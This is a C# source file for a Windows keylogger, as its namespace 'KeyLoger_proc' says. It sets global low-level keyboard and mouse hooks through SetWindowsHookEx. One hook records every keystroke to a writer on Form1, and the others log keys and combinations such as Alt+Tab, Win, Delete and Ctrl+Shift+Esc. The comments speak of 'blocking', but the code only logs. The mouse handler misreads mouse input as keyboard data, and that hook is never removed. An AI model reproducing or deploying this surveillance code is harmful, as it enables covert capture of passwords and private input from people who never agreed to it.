using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
   namespace KeyLoger_proc
{
       class Hook
       {
           private const int WH_KEYBOARD_LL = 13;//Keyboard hook;

           //Keys data structure
           [StructLayout(LayoutKind.Sequential)]
           private struct KBDLLHOOKSTRUCT
           {
               public Keys key;
           }

           //Using callbacks
           private LowLevelKeyboardProcDelegate m_callback;
           private LowLevelKeyboardProcDelegate m_callback_1;
           private LowLevelKeyboardProcDelegate m_callback_2;
           private LowLevelKeyboardProcDelegate m_callback_3;
           private LowLevelKeyboardProcDelegate m_callback_4;
           private LowLevelKeyboardProcDelegate m_callback_5;
           private LowLevelKeyboardProcDelegate m_callback_6;
           private LowLevelKeyboardProcDelegate m_callback_7;
           private LowLevelKeyboardProcDelegate m_callback_mouse;

           //Using hooks
           private IntPtr m_hHook;
           private IntPtr m_hHook_1;
           private IntPtr m_hHook_2;
           private IntPtr m_hHook_3;
           private IntPtr m_hHook_4;
           private IntPtr m_hHook_5;
           private IntPtr m_hHook_6;
           private IntPtr m_hHook_7;
           private IntPtr m_hHook_mouse;

           //Set hook on keyboard
           [DllImport("user32.dll", SetLastError = true)]
           private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

           //Unhook keyboard
           [DllImport("user32.dll", SetLastError = true)]
           private static extern bool UnhookWindowsHookEx(IntPtr hhk);

           //Hook handle
           [DllImport("Kernel32.dll", SetLastError = true)]
           private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

           //Calling the next hook
           [DllImport("user32.dll", SetLastError = true)]
           private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


           //<Alt>+<Tab> blocking
           public IntPtr LowLevelKeyboardHookProc_alt_tab(int nCode, IntPtr wParam, IntPtr lParam)
           {
             
               if (nCode >= 0)//If not alredy captured
               {
                   
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Tab)
                   {                     
                       Form1.write.Write("\nAlt+tab\n");//<Alt>+<Tab> blocking
                   }
               }
               return CallNextHookEx(m_hHook, nCode, wParam, lParam);//Go to next hook
           }

           //<WinKey> capturing
           public IntPtr LowLevelKeyboardHookProc_win(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin)
                   {

                       Form1.write.Write("\nWin\n");//<WinKey> blocking
                   }
               }
               return CallNextHookEx(m_hHook_1, nCode, wParam, lParam);//Go to next hook
           }

           //<Delete> capturing
           public IntPtr LowLevelKeyboardHookProc_del(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.Delete)
                   {
                       Form1.write.Write("\nDelete\n");//<Delete> blocking
                   }
               }
               return CallNextHookEx(m_hHook_3, nCode, wParam, lParam);//Go to next hook
           }

           //<Control> capturing
           public IntPtr LowLevelKeyboardHookProc_ctrl(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.RControlKey || objKeyInfo.key == Keys.LControlKey)
                   {
                       Form1.write.Write("\nctrl\n");//<Control> blocking
                   }
               }
               return CallNextHookEx(m_hHook_2, nCode, wParam, lParam);//Go to next hook
           }

           //<Alt> capturing
           public IntPtr LowLevelKeyboardHookProc_alt(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.Alt)
                   {
                       Form1.write.Write("\nAlt\n"); ;//<Alt> blocking
                   }
               }
               return CallNextHookEx(m_hHook_4, nCode, wParam, lParam);//Go to next hook
           }

           //<Alt>+<Space> blocking
           public IntPtr LowLevelKeyboardHookProc_alt_space(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Space)
                   {
                       Form1.write.Write("\n<Alt>+<Space>r\n"); ;//<Alt>+<Space> blocking
                   }
               }
               return CallNextHookEx(m_hHook_5, nCode, wParam, lParam);//Go to next hook
           }

           //<Control>+<Shift>+<Escape> blocking
           public IntPtr LowLevelKeyboardHookProc_control_shift_escape(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   if (objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey || objKeyInfo.key == Keys.LShiftKey || objKeyInfo.key == Keys.RShiftKey || objKeyInfo.key == Keys.Escape)
                   {
                       //return (IntPtr)1;
                       Form1.write.Write("\n<Control>+<Shift>+<Escape>\n");
                   }
               }
               return CallNextHookEx(m_hHook_6, nCode, wParam, lParam);//Go to next hook
           }
           public IntPtr LowLevelKeyboardHookProc_all(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   //return (IntPtr)1;
                   Form1.write.Write(objKeyInfo.key.ToString());

               }
               return CallNextHookEx(m_hHook_7, nCode, wParam, lParam);//Go to next hook
           }
           public IntPtr LowLevelKeyboardHookProc_mouse(int nCode, IntPtr wParam, IntPtr lParam)
           {
               if (nCode >= 0)//If not alredy captured
               {
                   KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));//Memory allocation and importing code data to KBDLLHOOKSTRUCT
                   //return (IntPtr)1;
                   Form1.write.Write(objKeyInfo.key.ToString());

               }
               return CallNextHookEx(m_hHook_mouse, nCode, wParam, lParam);//Go to next hook
           }
           //Delegate for using hooks
           private delegate IntPtr LowLevelKeyboardProcDelegate(int nCode, IntPtr wParam, IntPtr lParam);

           //Setting all hooks
           public void SetHook()
           {
               //Hooks callbacks by delegate
               m_callback = LowLevelKeyboardHookProc_win;
               m_callback_1 = LowLevelKeyboardHookProc_alt_tab;
               m_callback_2 = LowLevelKeyboardHookProc_ctrl;
               m_callback_3 = LowLevelKeyboardHookProc_del;
               m_callback_4 = LowLevelKeyboardHookProc_alt;
               m_callback_5 = LowLevelKeyboardHookProc_alt_space;
               m_callback_6 = LowLevelKeyboardHookProc_control_shift_escape;
               m_callback_7 = LowLevelKeyboardHookProc_all;
               m_callback_mouse = LowLevelKeyboardHookProc_mouse;
               //Hooks setting
               Process[] p = Process.GetProcesses();
               m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_1 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_1, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_2 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_2, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_3 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_3, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_4 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_4, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_5 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_5, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_6 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_6, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_7 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_7, GetModuleHandle(IntPtr.Zero), 0);
               m_hHook_mouse = SetWindowsHookEx(WH_MOUSE_LL, m_callback_mouse, GetModuleHandle(IntPtr.Zero), 0);
               
           }

           //Keyboard unhooking
           public void Unhook()
           {
               UnhookWindowsHookEx(m_hHook);
               UnhookWindowsHookEx(m_hHook_1);
               UnhookWindowsHookEx(m_hHook_2);
               UnhookWindowsHookEx(m_hHook_3);
               UnhookWindowsHookEx(m_hHook_4);
               UnhookWindowsHookEx(m_hHook_5);
               UnhookWindowsHookEx(m_hHook_6);
               UnhookWindowsHookEx(m_hHook_7);
           } 
          
       
           private const int WH_MOUSE_LL = 14;
           private const int WM_LBUTTONUP = 0x202;
          
       
       }
         
      
         static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
